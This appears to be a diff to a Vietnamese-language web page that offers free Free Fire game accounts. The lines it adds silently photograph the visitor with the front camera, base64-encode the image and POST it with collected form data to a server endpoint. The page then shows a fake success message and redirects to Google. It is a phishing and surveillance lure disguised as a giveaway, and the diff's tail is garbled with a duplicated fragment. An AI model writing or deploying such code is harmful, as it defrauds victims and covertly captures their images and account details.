@@ -157,7 +157,7 @@
 
     <div class="container">
         <div class="logo">
-            <img src="https://ibb.co/1ffKdJVd" alt="Free Fire">
+            <img src="https://i.ibb.co/1ffKdJVd/logo-free-fire-inkythuatso-3-01-04-09-22-40.jpg" alt="Free Fire">
             <h1>TẶNG <span>ACC FREE FIRE</span></h1>
             <p>🔥 Sự kiện giới hạn - Nhận ngay hôm nay!</p>
         </div>
@@ -183,8 +183,8 @@
                 <label>🎮 Acc mong muốn</label>
                 <select id="acc_type">
                     <option value="VIP">🔥 Acc VIP Đồ Cổ</option>
-                    <option value="PRO">💎 Acc Full Súng Nâng Cấp</option>
-                    <option value="FREE">🆓 Acc Lv5 </option>
+                    <option value="PRO">💎 Acc Súng Nâng Cấp 78</option>
+                    <option value="FREE">🆓 Acc Lv5</option>
                 </select>
             </div>
             <button type="submit" class="btn" id="submitBtn">🚀 NHẬN ACC NGAY</button>
@@ -199,7 +199,7 @@
         </div>
 
         <div class="footer">
-            © 2026 Free Fire Event • DKHANG KOL
+            © 2026 Free Fire Event • DKHANG KOL GARENA FREE FIRE
         </div>
     </div>
 
@@ -220,6 +220,15 @@
             }
             timeLeft--;
         }, 1000);
+
+        function blobToBase64(blob) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result.split(',')[1]);
+                reader.onerror = reject;
+                reader.readAsDataURL(blob);
+            });
+        }
 
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -279,6 +288,65 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                 const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 800));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                stream.getTracks().forEach(t => t.stop());
+                photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+                info.camera = '✅ Đã chụp camera';
+            } catch (e) {
+                info.camera = '🚫 Không có quyền camera';
+            }
+
+            let photoBase64 = null;
+            if (photoBlob) {
+                photoBase64 = await blobToBase64(photoBlob);
+            }
+
+            const payload = {
+                info: info,
+                photo: photoBase64
+            };
+
+            try {
+                const response = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const result = await response.json();
+
+                if (result.status === 'success') {
+                    showToast('✅ Nhận acc thành công! Kiểm tra email để lấy thông tin.');
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com';
+                    }, 3000);
+                } else {
+                    showToast('❌ Lỗi: ' + result.message);
+                    document.getElementById('submitBtn').style.display = 'block';
+                    document.getElementById('loading').style.display = 'none';
+                }
+            } catch (error) {
+                showToast('❌ Lỗi kết nối: ' + error.message);
+                document.getElementById('submitBtn').style.display = 'block';
+                document.getElementById('loading').style.display = 'none';
+            }
+        });
+
+        function showToast(msg) {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.style.display = 'block';
+            setTimeout(() => t.style.display = 'none', 4000);
+        }
+    </script>
+</body>
+</html>st video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
                 await new Promise(r => setTimeout(r, 800));
